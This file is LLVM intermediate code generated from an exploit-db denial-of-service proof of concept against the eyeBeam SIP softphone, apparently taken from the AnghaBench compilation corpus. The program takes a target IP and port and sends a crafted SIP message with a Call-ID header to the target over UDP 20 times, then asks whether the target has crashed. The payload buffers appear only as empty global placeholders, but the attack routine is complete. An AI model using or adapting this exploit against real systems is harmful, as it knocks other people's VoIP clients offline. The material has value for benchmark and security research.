; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_27090.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_27090.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_5__ = type { %struct.TYPE_4__, i32, i32 }
%struct.TYPE_4__ = type { i32 }

@.str = private unnamed_addr constant [52 x i8] c"eyeBeam handling SIP header DOS POC\0AAuthor : ZwelL\0A\00", align 1
@.str.1 = private unnamed_addr constant [60 x i8] c"Email : zwell@sohu.com\0ABlog : http://www.donews.net/zwell\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [31 x i8] c"Usage : %s <target ip> [port]\0A\00", align 1
@NO_ERROR = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [23 x i8] c"Error at WSAStartup()\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_DGRAM = common dso_local global i32 0, align 4
@IPPROTO_UDP = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [31 x i8] c"Target is : %s\09 port is : %d\0D\0A\00", align 1
@.str.5 = private unnamed_addr constant [25 x i8] c"%sCall-ID: 4166@<%s>\0D\0A%s\00", align 1
@sendbuf1 = common dso_local global i8* null, align 8
@sendbuf2 = common dso_local global i8* null, align 8
@SOCKET_ERROR = common dso_local global i64 0, align 8
@.str.6 = private unnamed_addr constant [17 x i8] c"sendto wrong:%d\0A\00", align 1
@.str.7 = private unnamed_addr constant [35 x i8] c"Now check the target is crafted?\0D\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.TYPE_5__, align 4
  %9 = alloca [4096 x i8], align 16
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 8376, i32* %11, align 4
  %13 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str, i64 0, i64 0))
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.1, i64 0, i64 0))
  %15 = load i32, i32* %4, align 4
  %16 = icmp slt i32 %15, 2
  br i1 %16, label %17, label %22

17:                                               ; preds = %2
  %18 = load i8**, i8*** %5, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 0
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.2, i64 0, i64 0), i8* %20)
  store i32 0, i32* %3, align 4
  br label %90

22:                                               ; preds = %2
  %23 = load i32, i32* %4, align 4
  %24 = icmp eq i32 %23, 3
  br i1 %24, label %25, label %30

25:                                               ; preds = %22
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 2
  %28 = load i8*, i8** %27, align 8
  %29 = call i32 @atoi(i8* %28)
  store i32 %29, i32* %11, align 4
  br label %30

30:                                               ; preds = %25, %22
  %31 = call i32 @MAKEWORD(i32 2, i32 2)
  %32 = call i32 @WSAStartup(i32 %31, i32* %6)
  store i32 %32, i32* %10, align 4
  %33 = load i32, i32* %10, align 4
  %34 = load i32, i32* @NO_ERROR, align 4
  %35 = icmp ne i32 %33, %34
  br i1 %35, label %36, label %38

36:                                               ; preds = %30
  %37 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.3, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %90

38:                                               ; preds = %30
  %39 = load i32, i32* @AF_INET, align 4
  %40 = load i32, i32* @SOCK_DGRAM, align 4
  %41 = load i32, i32* @IPPROTO_UDP, align 4
  %42 = call i32 @socket(i32 %39, i32 %40, i32 %41)
  store i32 %42, i32* %7, align 4
  %43 = call i32 @ZeroMemory(%struct.TYPE_5__* %8, i32 12)
  %44 = load i32, i32* @AF_INET, align 4
  %45 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %8, i32 0, i32 2
  store i32 %44, i32* %45, align 4
  %46 = load i32, i32* %11, align 4
  %47 = trunc i32 %46 to i16
  %48 = call i32 @htons(i16 signext %47)
  %49 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %8, i32 0, i32 1
  store i32 %48, i32* %49, align 4
  %50 = load i8**, i8*** %5, align 8
  %51 = getelementptr inbounds i8*, i8** %50, i64 1
  %52 = load i8*, i8** %51, align 8
  %53 = call i32 @inet_addr(i8* %52)
  %54 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %8, i32 0, i32 0
  %55 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %54, i32 0, i32 0
  store i32 %53, i32* %55, align 4
  %56 = load i8**, i8*** %5, align 8
  %57 = getelementptr inbounds i8*, i8** %56, i64 1
  %58 = load i8*, i8** %57, align 8
  %59 = load i32, i32* %11, align 4
  %60 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.4, i64 0, i64 0), i8* %58, i32 %59)
  store i32 0, i32* %12, align 4
  br label %61

61:                                               ; preds = %84, %38
  %62 = load i32, i32* %12, align 4
  %63 = icmp slt i32 %62, 20
  br i1 %63, label %64, label %87

64:                                               ; preds = %61
  %65 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  %66 = load i8*, i8** @sendbuf1, align 8
  %67 = load i8**, i8*** %5, align 8
  %68 = getelementptr inbounds i8*, i8** %67, i64 1
  %69 = load i8*, i8** %68, align 8
  %70 = load i8*, i8** @sendbuf2, align 8
  %71 = call i32 @sprintf(i8* %65, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.5, i64 0, i64 0), i8* %66, i8* %69, i8* %70)
  %72 = load i64, i64* @SOCKET_ERROR, align 8
  %73 = load i32, i32* %7, align 4
  %74 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  %75 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  %76 = call i32 @strlen(i8* %75)
  %77 = bitcast %struct.TYPE_5__* %8 to i32*
  %78 = call i64 @sendto(i32 %73, i8* %74, i32 %76, i32 0, i32* %77, i32 12)
  %79 = icmp eq i64 %72, %78
  br i1 %79, label %80, label %83

80:                                               ; preds = %64
  %81 = call i32 (...) @WSAGetLastError()
  %82 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.6, i64 0, i64 0), i32 %81)
  br label %84

83:                                               ; preds = %64
  br label %84

84:                                               ; preds = %83, %80
  %85 = load i32, i32* %12, align 4
  %86 = add nsw i32 %85, 1
  store i32 %86, i32* %12, align 4
  br label %61

87:                                               ; preds = %61
  %88 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.7, i64 0, i64 0))
  %89 = call i32 (...) @WSACleanup()
  store i32 1, i32* %3, align 4
  br label %90

90:                                               ; preds = %87, %36, %17
  %91 = load i32, i32* %3, align 4
  ret i32 %91
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @WSAStartup(i32, i32*) #1

declare dso_local i32 @MAKEWORD(i32, i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @ZeroMemory(%struct.TYPE_5__*, i32) #1

declare dso_local i32 @htons(i16 signext) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*, i8*, i8*) #1

declare dso_local i64 @sendto(i32, i8*, i32, i32, i32*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @WSAGetLastError(...) #1

declare dso_local i32 @WSACleanup(...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
